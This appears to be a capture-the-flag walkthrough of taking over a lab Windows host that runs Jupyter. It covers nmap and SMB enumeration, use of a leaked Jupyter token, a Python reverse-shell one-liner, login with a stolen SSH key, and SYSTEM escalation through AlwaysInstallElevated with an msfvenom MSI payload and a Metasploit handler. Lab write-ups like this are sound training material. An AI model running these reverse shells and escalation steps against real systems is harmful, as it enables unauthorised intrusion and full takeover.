We start with a port enumeration 
```bash
nmap -sC -sV 10.10.111.141
```

Output:
```bash
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 2b:17:d8:8a:1e:8c:99:bc:5b:f5:3d:0a:5e:ff:5e:5e (RSA)
|   256 3c:c0:fd:b5:c1:57:ab:75:ac:81:10:ae:e2:98:12:0d (ECDSA)
|_  256 e9:f0:30:be:e6:cf:ef:fe:2d:14:21:a0:ac:45:7b:70 (ED25519)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DEV-DATASCI-JUP
| Not valid before: 2023-11-07T20:43:08
|_Not valid after:  2024-05-08T20:43:08
|_ssl-date: 2023-11-08T21:59:06+00:00; +7s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: DEV-DATASCI-JUP
|   NetBIOS_Domain_Name: DEV-DATASCI-JUP
|   NetBIOS_Computer_Name: DEV-DATASCI-JUP
|   DNS_Domain_Name: DEV-DATASCI-JUP
|   DNS_Computer_Name: DEV-DATASCI-JUP
|   Product_Version: 10.0.17763
|_  System_Time: 2023-11-08T21:58:57+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8888/tcp  open  http          Tornado httpd 6.0.3
|_http-server-header: TornadoServer/6.0.3
| http-robots.txt: 1 disallowed entry 
|_/ 
| http-title: Jupyter Notebook
|_Requested resource was /login?next=%2Ftree%3F
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| smb2-time: 
|   date: 2023-11-08T21:58:58
|_  start_date: N/A
|_clock-skew: mean: 6s, deviation: 0s, median: 5s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

There are two interesting services _SMB_ and the _webserver_, first we enumerate the SMB service via anoynmous login:

```bash
smbclient -L \\\\10.10.111.141\\
prompt yes
 ```

Output:
```bash
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
datasci-team    Disk      
IPC$            IPC       Remote IPC
```

the most suspicious is _datasci-team_ we continue to investigate with the following commands:

```bash
smbclient \\\\10.10.111.141\\datasci-team
cd misc 
get jupyter-token.txt #before to find the token I view the other files and directories
```

we find a token if we vist the following URL _http://10.10.111.141:8888/login_ and insert the token to gain an access.
there is a god button called _New_, we click on it and the click on _Python3_, it seems we can insert our python code and gain a revshell

```bash
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOUR IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
```
```bash
python3 -m pwncat -lp <PORT>
```
we click run and we obtain the revshell, it's time to search inside the filesystem and inside the folder _/home/dev-datasci/dev-datasci-lowpriv_id_ed25519_ it's a private key for a user called "dev-datasci-lowpriv", we can enter with the following command:

```bash
ssh -i <nome chiave> dev-datasci-lowpriv@10.10.111.141
```

we're in, we can retrieve the user key so it's time to try some enumeration commands and one it seems very interesting, this one:
```powershell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

after some research online we can exploit it with the following commands:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f msi -o <name>.msi
```
remember to pass the malicious .msi woth a python server to the machine target
```bash
msfconsole -q -x "use multi/handler; set payload windows/x64/shell_reverse_tcp; set lhost <ip>; set lport <port>; exploit"
```
```bash
msiexec /i <file.msi> /quiet /qn /norestart
```
sbam we're system.
